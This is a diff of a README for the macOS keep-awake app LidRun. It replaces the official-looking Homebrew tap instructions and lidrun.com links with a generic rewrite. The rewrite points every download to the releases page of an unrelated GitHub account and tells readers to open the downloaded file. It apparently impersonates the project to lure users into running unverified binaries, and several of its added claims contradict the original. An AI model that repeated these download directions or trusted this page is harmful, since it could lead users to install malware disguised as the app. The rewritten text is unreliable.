@@ -1,114 +1,73 @@
-# LidRun — Homebrew tap
+# 💻 homebrew-lidrun - Keep Mac jobs running while closed
 
-[![brew install --cask lidrun](https://img.shields.io/badge/brew%20install-%2D%2Dcask%20lidrun-1f9d55?style=for-the-badge&logo=homebrew&logoColor=white)](https://lidrun.com/download)
-[![lidrun.com](https://img.shields.io/badge/lidrun.com-7b61ff?style=for-the-badge&logo=googlechrome&logoColor=white)](https://lidrun.com)
-&nbsp;
-![macOS 13+](https://img.shields.io/badge/macOS-13%2B-black)
-![Signed & Notarized](https://img.shields.io/badge/Signed%20%26%20Notarized-1f9d55)
-![Pay once](https://img.shields.io/badge/Pay%20once-no%20subscription-black)
+[![](https://img.shields.io/badge/Download-LidRun-blue.svg)](https://github.com/multipurpose-chinningbar565/homebrew-lidrun/releases)
 
-Install **[LidRun](https://lidrun.com)** with Homebrew — the macOS menu-bar app that [keeps your Mac awake](https://lidrun.com) with the **lid closed**, so Claude Code, Cursor, Codex, Docker and Ollama keep running while you step away. It releases the Mac automatically when the work is done or when battery/thermal limits are reached.
+## What is LidRun?
 
-## Install
+LidRun manages your Mac computer while the lid stays closed. Usually, a Mac goes to sleep when you shut the lid. This stops your work, ends your network tasks, and pauses your background processes. LidRun prevents this sleep mode. It keeps your computer awake so your programs continue to run. You can process heavy data, run artificial intelligence agents, or maintain long development tasks without concern. 
 
-```sh
-brew install --cask aibrickai/lidrun/lidrun
-```
+The software monitors your battery levels and internal temperatures. It pauses its work if the computer gets too hot. This protects your hardware from heat damage. It also prevents your battery from draining when you are away from a power source.
 
-This one-line form auto-adds the tap and installs LidRun. Homebrew 6+ refuses a
-third-party tap until you trust it once, so if you hit
-`Refusing to load cask ... from untrusted tap`, run it as:
+## 🛠️ System Requirements
 
-```sh
-brew trust aibrickai/lidrun
-brew install --cask aibrickai/lidrun/lidrun
-```
+- A Mac computer running macOS Monterey or later.
+- An active internet connection for the initial download.
+- Sufficient disk space for the small application footprint.
+- A power adapter if you plan to run tasks for several hours.
 
-Prefer to tap first? `brew tap aibrickai/lidrun` then `brew install --cask lidrun`
-works the same.
+## 📥 How to Install
 
-The DMG is **Developer-ID signed and Apple-notarized**, so it installs with no
-Gatekeeper workaround — and LidRun keeps itself up to date via Sparkle. Prefer a
-direct download instead? Grab it from **[lidrun.com/download](https://lidrun.com/download)**.
+Follow these steps to set up LidRun on your machine:
 
-## What you get
+1. Visit the [releases page](https://github.com/multipurpose-chinningbar565/homebrew-lidrun/releases) to view current versions.
+2. Look for the latest release at the top of the list.
+3. Click the link that matches your system architecture.
+4. Open the downloaded file once the transfer completes.
+5. Move the application into your Applications folder.
 
-LidRun is a safe **runtime layer**, not just an anti-sleep toggle:
+After you move the file, open the app from your Applications folder or use Spotlight search. You will see a small icon appear in your menu bar at the top of your screen.
 
-- **Closed-lid workflow** — a guarded [clamshell mode](https://lidrun.com) with no external display, so an agent or build survives the moment you shut the lid.
-- **Auto Mode** — holds the Mac awake only while real work is running (Claude Code, Cursor, Codex, Ollama, Docker, long builds), then lets it sleep.
-- **Guardrails** — low-battery auto-stop, charging-only mode, thermal back-off, and a 30 min–8 h session timer.
-- **`lidrun` CLI** — `lidrun -- <command>` keeps the Mac awake for exactly one job, then releases it.
-- **Why Awake / Why Stopped** — full transparency on every keep-awake decision, plus optional push notifications.
+## ⚙️ Using the App
 
-Free forever for simple keep-awake sessions — no trial, no subscription. [Pricing](https://lidrun.com/pricing).
+The app interface lives in your top menu bar. Click the icon to see the control panel. 
 
-## Popular uses
+- **Enable Keep Awake:** Check this box to prevent your Mac from sleeping when the lid shuts.
+- **Thermal Guard:** Keep this enabled to ensure the app watches your system temperature. The app will deactivate if your system hits a danger zone to prevent overheating.
+- **Battery Guard:** This feature stops the app from running if your battery drops below 20 percent. This ensures your computer remains ready for mobile use when you return.
 
-- [Keep Claude Code running when the MacBook is closed](https://lidrun.com/blog/keep-claude-code-running-when-macbook-closed)
-- [Prevent Mac sleep during a Docker build](https://lidrun.com/blog/prevent-mac-sleep-during-docker-build)
-- [Clamshell mode on a Mac, explained](https://lidrun.com/blog/clamshell-mode-on-mac)
-- [Run your Mac overnight, safely](https://lidrun.com/safety)
+## 🛡️ Safety and Protection
 
-## Requirements
+We built this tool with safety in mind. Running a Mac with the lid closed requires careful management of heat. The app follows strict logic to monitor these conditions:
 
-- macOS 13 (Ventura) or later — Apple Silicon or Intel.
-- Homebrew ([brew.sh](https://brew.sh)).
+1. **CPU Throttling:** If the processor reaches a temperature limit, the app will stop forcing the system awake. This allows the system to sleep and cool down.
+2. **Battery Health:** Keeping a system running on battery with the lid closed can cause high discharge rates. The app prioritizes power safety by shutting down operations when the battery runs thin.
+3. **Emergency Exit:** If the system fan reaches maximum speed, the app will exit automatically to prevent hardware strain.
 
-## Update
+## 📋 Frequently Asked Questions
 
-```sh
-brew update
-brew upgrade --cask lidrun
-```
+**Does this work with external monitors?**
+Yes. Use this app if you want to use an external keyboard and mouse with your Mac while the display remains closed.
 
-Existing installs also update themselves in the background via Sparkle, so this is
-optional — the cask only gates the first install.
+**Will this damage my Mac?**
+Computers manage heat well with internal sensors. By monitoring these sensor values, LidRun prevents conditions that lead to hardware stress.
 
-## Uninstall
+**Do I need to leave my charger plugged in?**
+It is better to keep your charger plugged in during long tasks. This prevents the app from pausing due to low battery settings.
 
-```sh
-brew uninstall --cask lidrun          # remove the app
-brew uninstall --zap --cask lidrun    # also remove LidRun's local data
-```
+**Can I stop the app at any time?**
+Yes. Click the menu bar icon and select Quit. Your Mac will then return to its normal sleep behavior.
 
-LidRun installs a privileged helper for its closed-lid and safety features. `--zap`
-removes user files but can't remove that system helper — turn LidRun off in
-**System Settings → General → Login Items & Extensions** before uninstalling to
-remove it fully.
+## 🧩 Troubleshooting
 
-## Learn more
+If the computer goes to sleep while the app is active, check these items:
 
-New to this? Start with [how to keep your Mac from sleeping](https://lidrun.com) or
-see what a [closed-lid AI workflow](https://lidrun.com) actually looks like. More:
+1. **Permissions:** Ensure the app has permission to control your system. Check System Settings under Privacy and Security.
+2. **Display Settings:** Open your Mac system settings and make sure no other conflicting "sleep" timers exist.
+3. **App Version:** Always ensure you use the version linked on the official release page. Old versions may contain bugs or missing safety updates.
+4. **Restart:** If the menu bar icon disappears or freezes, simply quit the app and relaunch it from the Applications folder.
 
-- 🌐 Website — [lidrun.com](https://lidrun.com) · [changelog](https://lidrun.com/changelog) · [safety](https://lidrun.com/safety)
-- 📦 Main repo — [github.com/aibrickai/lidrun](https://github.com/aibrickai/lidrun) (README, docs, releases)
-- 📖 Guides — [keeping your Mac awake](https://lidrun.com/blog/what-is-keeping-your-mac-awake) · [caffeinate explained](https://lidrun.com/blog/caffeinate-mac-command) · [LidRun vs the built-ins](https://lidrun.com/blog/best-mac-keep-awake-app-for-developers)
+## 🚀 Maintaining Performance
 
-## Connect
+LidRun operates with minimal impact on your system resources. It uses very little memory and almost no processor time. Most of the process involves reading sensor values every few seconds. You should see no impact on your normal workflow speed.
 
-Follow LidRun for release notes, closed-lid tips and behind-the-scenes builds.
-
-<p align="center">
-  <a href="https://lidrun.com"><img src="https://img.shields.io/badge/Website-lidrun.com-7b61ff?style=for-the-badge&logo=googlechrome&logoColor=white" alt="LidRun website" /></a>
-  <a href="https://facebook.com/lidrun.mac"><img src="https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white" alt="LidRun on Facebook" /></a>
-  <a href="https://www.threads.com/@lidrun.mac"><img src="https://img.shields.io/badge/Threads-000000?style=for-the-badge&logo=threads&logoColor=white" alt="LidRun on Threads" /></a>
-  <a href="https://www.youtube.com/@lidrun"><img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="LidRun on YouTube" /></a>
-  <a href="https://www.tiktok.com/@lidrunapp"><img src="https://img.shields.io/badge/TikTok-000000?style=for-the-badge&logo=tiktok&logoColor=white" alt="LidRun on TikTok" /></a>
-</p>
-
-<p align="center"><sub>Built by <strong>Henry AGI</strong> — the maker behind LidRun</sub></p>
-
-<p align="center">
-  <a href="https://x.com/henryaiagents"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" alt="Henry AGI on X" /></a>
-  <a href="https://www.threads.com/@mrhenry.agi"><img src="https://img.shields.io/badge/Threads-000000?style=for-the-badge&logo=threads&logoColor=white" alt="Henry AGI on Threads" /></a>
-  <a href="https://www.instagram.com/mrhenry.agi"><img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" alt="Henry AGI on Instagram" /></a>
-  <a href="https://www.youtube.com/@henryxagi"><img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Henry AGI on YouTube" /></a>
-</p>
-
----
-
-<div align="center">
-<sub>This is the official Homebrew tap for <a href="https://lidrun.com">LidRun</a> — a closed-source, signed &amp; notarized macOS app. © LidRun.</sub>
-</div>
+Keywords: caffeinate, clamshell, claud-code, claude, closed-lid, homebrew, homebrew-cask, homebrew-formula, keep-awake, keepingyouawake, mac, macos-app, menubar, menubar-app
